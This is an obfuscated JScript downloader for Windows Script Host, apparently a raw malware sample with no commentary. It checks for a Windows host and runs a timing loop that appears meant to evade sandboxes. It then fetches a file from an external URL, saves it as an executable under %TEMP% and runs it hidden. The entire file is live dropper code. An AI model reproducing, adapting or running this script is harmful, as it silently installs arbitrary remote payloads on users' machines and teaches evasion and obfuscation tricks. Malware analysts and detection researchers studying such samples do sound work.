var p = false;
var k = "CreateObject";
var s = function Su() {return WScript[k]("WScript.Shell");}(), P = 11;
var o = "MSXML2.XMLHTTP";
var i0 = 2123213;
var Fv = 0;
function H(a){s["Run"](a, Fv, Fv);};
function T(){return "" + o;};
function Nq(KT, H0){Fv = Fv * 1; return KT - H0;};
function er(){return k;};
/*@cc_on
  @if (@_win32 || @_win64)
    p = true;
  @end
@*/
if (p)
{
var m = "";
function YH(){return 22;};
var ZX = 0; var G = 0;
function EI()
{
var vz = new this["Date"]();
var x = vz["getUTCMilliseconds"]();
WScript["Sleep"](YH());
var vz = new this["Date"]();
var J = vz["getUTCMilliseconds"]();
WScript["Sleep"](YH());
var vz = new this["Date"]();
var i = vz["getUTCMilliseconds"]();
var ZX = "YV";
ZX = Nq(J, x);
var G = "W";
G = Nq(i, J);
m = "open";
return Nq(ZX, G);
}
var Mo = false;
var a0 = false;
for (var Ol = Fv; Ol < YH() * 1; Ol++){if (EI() != Fv){
Mo = true; 
G = "31" + 11 * ZX + G; 
a0 = true; 
break;
}}
function kL() {return ((Mo == true) && (Mo == a0)) ? 1 : Fv;};
if (Mo && kL() && a0){
function ZS() {return s["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "OduRu36rzxiTRQG.exe";};
 Gk = T();
 El = WScript[k](Gk);
 var Cj = 1;
 while (Cj){
try {
El[m]("GET", "http://greenellebox.com/a1odk", false);
El["send"]();
X = "Sleep";
for (;;){WScript[X](YH() * 11); if (El["readystate"] >= 2 * 2) break;};
Cj = Fv;
} catch(wo){};
}
function vq(Sk) {var Mu = (1, 2, 3, 4, 5, Sk); return Mu;};
B = WScript[er()]("ADODB.Stream");
Gk = B;
Gk[m]();
Gk["type"] = vq(1);
Gk["write"](El["ResponseBody"]);
B["position"] = vq(Fv);
Gk["Save" + "ToFile"](ZS(), 2);
B["c"+"lose"]();
YF = ZS();
H(YF);
}
}

